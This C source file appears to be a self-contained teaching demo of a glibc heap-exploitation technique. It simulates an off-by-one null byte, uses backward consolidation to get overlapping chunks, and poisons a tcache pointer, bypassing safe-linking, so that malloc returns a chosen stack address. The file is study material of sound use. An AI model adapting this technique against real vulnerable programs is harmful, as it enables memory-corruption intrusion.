#include <stdio.h>
#include <stdlib.h>
#include <assert.h>
#include <stdint.h>

// 64-bit based comments
// valid exploitation for glibc-2.32 or higher
// if you want to use this attack against glibc-2.31 or lower
// you have to remove the safe-linking xor at the "poisoned_chunk"->fd
int main() {
    intptr_t stack_var[0x10];
    intptr_t* target = NULL;

    // choose a properly aligned target address
    for(int i=0; i < 0x10; i++) {
        if(((long)&stack_var[i] & 0xf) == 0) {
            target = &stack_var[i];
            break;
        }
    }
    assert(target != NULL);
    printf("Our target address to return is %p\n", target);
    
    intptr_t* fake_chunk = (intptr_t*)malloc(0x38); // final size 0x40
    intptr_t* poisoned_chunk = (intptr_t*)malloc(0x28); // final size 0x30
    intptr_t* victim = (intptr_t*)malloc(0xf8); // final size would be 0x101
                                                // after off-by-one 0x100
    
    fake_chunk[0] = 0; // prev_size
    fake_chunk[1] = 0x60; // size == 0x30 (poisoned_chunk) + 0x40 (fake_chunk)
                          // - 0x10 (metadata) = 0x60
    fake_chunk[2] = (intptr_t)fake_chunk; // fd
    fake_chunk[3] = (intptr_t)fake_chunk; // bk
    // fd and bk are set to fake_chunk in order to bypass unlink check
    
    // set prev_size to pass prev_size == size check
    victim[-2] = 0x60;
    
    // off-by-one vuln
    ((char*)victim)[-8] = 0;
    
    printf("Fill tcache.\n");
    intptr_t *x[7];
    for(int i=0; i < sizeof(x) / sizeof(intptr_t*); i++) {
        x[i] = malloc(0xf8);
    }
    
    printf("Fill up tcache list.\n");
    for(int i=0; i < sizeof(x) / sizeof(intptr_t*); i++) {
        free(x[i]);
    }
    
    printf("Size Before: %ld\n", ((intptr_t*)fake_chunk)[1]);
    
    // trigger backwards consolidation
    free(victim);
    
    assert(((intptr_t*)fake_chunk)[1] == 0x161);
    printf("Size After: %ld\n", ((intptr_t*)fake_chunk)[1]);
    
    intptr_t* overlapped = malloc(0x158); // this chunk would grab the overlapping
                                          // chunk from bin
    
    // we need at least one freed chunk in the corresponding tcache[tidx (tcache index)]
    // bin in order to bypass tcache mitigation
    void* tcache_bypass = malloc(0x28);
    free(tcache_bypass);
    
    // free "poisoned_chunk" (we have control over this location due to the
    // overlapping chunk)
    free(poisoned_chunk);
    
    // printf("Next malloc(0x158) is at %p %p\n", overlapped, fake_chunk);
    // now we can overwrite "poisoned_chunk"->fd through "overlapped"
    overlapped[6] = (long)target ^ ((long)&overlapped[6] >> 12); // pre-calculated
                                                // "poisoned_chunk"->fd index
    
    // the 2nd malloc will return our arbitrary pointer
    malloc(0x28);
    void* returned = (void*)malloc(0x28);
    printf("Final returned address %p\n", returned);
    
    assert(target == returned);
    return 0;
}
